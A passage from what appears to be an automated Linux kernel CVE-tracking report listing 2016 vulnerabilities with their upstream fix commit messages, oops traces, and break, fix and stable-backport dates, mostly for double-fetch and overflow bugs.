    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Acked-by: Yuchung Cheng <ycheng@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/tcp_input.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5696
Break Date: 2012-07-17
Break Commit: 282f23c6ee343126156dd41218b22ece96d747e3
Break Tag: 3.6
Linus Fix Date: 2016-07-11
Linus Commit: 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Linus Tag: 4.7
Stable Date: 2016-08-16
Stable Commit: 860c53258e634c54f70252c352bae7bac30724a9
Stable Tag: 3.14.76

CVE-2016-5728:
CVE-2016-5728:
CVE-2016-5728:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5728:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9bf292bfca94694a721449e3fd752493856710f6
Author: Ashutosh Dixit <ashutosh.dixit@intel.com>
Date:   Wed Apr 27 14:36:05 2016 -0700

    misc: mic: Fix for double fetch security bug in VOP driver
    
    The MIC VOP driver does two successive reads from user space to read a
    variable length data structure. Kernel memory corruption can result if
    the data structure changes between the two reads. This patch disallows
    the chance of this happening.
    
    Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651
    Reported by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com>
    Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/misc/mic/vop/vop_vringh.c |    5 +++++
 1 file changed, 5 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5728
Break Date: 2013-09-26
Break Commit: f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
Break Tag: 3.13
Linus Fix Date: 2016-04-27
Linus Commit: 9bf292bfca94694a721449e3fd752493856710f6
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5828:
CVE-2016-5828:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5828:
CVE-2016-5828:
CVE-2016-5828:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Author: Cyril Bur <cyrilbur@gmail.com>
Date:   Fri Jun 17 14:58:34 2016 +1000

    powerpc/tm: Always reclaim in start_thread() for exec() class syscalls
    
    Userspace can quite legitimately perform an exec() syscall with a
    suspended transaction. exec() does not return to the old process, rather
    it load a new one and starts that, the expectation therefore is that the
    new process starts not in a transaction. Currently exec() is not treated
    any differently to any other syscall which creates problems.
    
    Firstly it could allow a new process to start with a suspended
    transaction for a binary that no longer exists. This means that the
    checkpointed state won't be valid and if the suspended transaction were
    ever to be resumed and subsequently aborted (a possibility which is
    exceedingly likely as exec()ing will likely doom the transaction) the
    new process will jump to invalid state.
    
    Secondly the incorrect attempt to keep the transactional state while
    still zeroing state for the new process creates at least two TM Bad
    Things. The first triggers on the rfid to return to userspace as
    start_thread() has given the new process a 'clean' MSR but the suspend
    will still be set in the hardware MSR. The second TM Bad Thing triggers
    in __switch_to() as the processor is still transactionally suspended but
    __switch_to() wants to zero the TM sprs for the new process.
    
    This is an example of the outcome of calling exec() with a suspended
    transaction. Note the first 700 is likely the first TM bad thing
    decsribed earlier only the kernel can't report it as we've loaded
    userspace registers. c000000000009980 is the rfid in
    fast_exception_return()
    
      Bad kernel stack pointer 3fffcfa1a370 at c000000000009980
      Oops: Bad kernel stack pointer, sig: 6 [#1]
      CPU: 0 PID: 2006 Comm: tm-execed Not tainted
      NIP: c000000000009980 LR: 0000000000000000 CTR: 0000000000000000
      REGS: c00000003ffefd40 TRAP: 0700   Not tainted
      MSR: 8000000300201031 <SF,ME,IR,DR,LE,TM[SE]>  CR: 00000000  XER: 00000000
      CFAR: c0000000000098b4 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 00003fffcfa1a370 0000000000000000 0000000000000000
      GPR04: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR08: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR12: 00003fff966611c0 0000000000000000 0000000000000000 0000000000000000
      NIP [c000000000009980] fast_exception_return+0xb0/0xb8
      LR [0000000000000000]           (null)
      Call Trace:
      Instruction dump:
      f84d0278 e9a100d8 7c7b03a6 e84101a0 7c4ff120 e8410170 7c5a03a6 e8010070
      e8410080 e8610088 e8810090 e8210078 <4c000024> 48000000 e8610178 88ed023b
    
      Kernel BUG at c000000000043e80 [verbose debug info unavailable]
      Unexpected TM Bad Thing exception at c000000000043e80 (msr 0x201033)
      Oops: Unrecoverable exception, sig: 6 [#2]
      CPU: 0 PID: 2006 Comm: tm-execed Tainted: G      D
      task: c0000000fbea6d80 ti: c00000003ffec000 task.ti: c0000000fb7ec000
      NIP: c000000000043e80 LR: c000000000015a24 CTR: 0000000000000000
      REGS: c00000003ffef7e0 TRAP: 0700   Tainted: G      D
      MSR: 8000000300201033 <SF,ME,IR,DR,RI,LE,TM[SE]>  CR: 28002828  XER: 00000000
      CFAR: c000000000015a20 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 c00000003ffefa60 c000000000db5500 c0000000fbead000
      GPR04: 8000000300001033 2222222222222222 2222222222222222 00000000ff160000
      GPR08: 0000000000000000 800000010000d033 c0000000fb7e3ea0 c00000000fe00004
      GPR12: 0000000000002200 c00000000fe00000 0000000000000000 0000000000000000
      GPR16: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR20: 0000000000000000 0000000000000000 c0000000fbea7410 00000000ff160000
      GPR24: c0000000ffe1f600 c0000000fbea8700 c0000000fbea8700 c0000000fbead000
      GPR28: c000000000e20198 c0000000fbea6d80 c0000000fbeab680 c0000000fbea6d80
      NIP [c000000000043e80] tm_restore_sprs+0xc/0x1c
      LR [c000000000015a24] __switch_to+0x1f4/0x420
      Call Trace:
      Instruction dump:
      7c800164 4e800020 7c0022a6 f80304a8 7c0222a6 f80304b0 7c0122a6 f80304b8
      4e800020 e80304a8 7c0023a6 e80304b0 <7c0223a6> e80304b8 7c0123a6 4e800020
    
    This fixes CVE-2016-5828.
    
    Fixes: bc2a9408fa65 ("powerpc: Hook in new transactional memory code")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Cyril Bur <cyrilbur@gmail.com>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5828
Break Date: 2013-02-15
Break Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Break Tag: 3.9
Linus Fix Date: 2016-06-27
Linus Commit: 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff19f63ed47309550b47831ac39176d9910fadfe
Stable Tag: 3.14.74

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
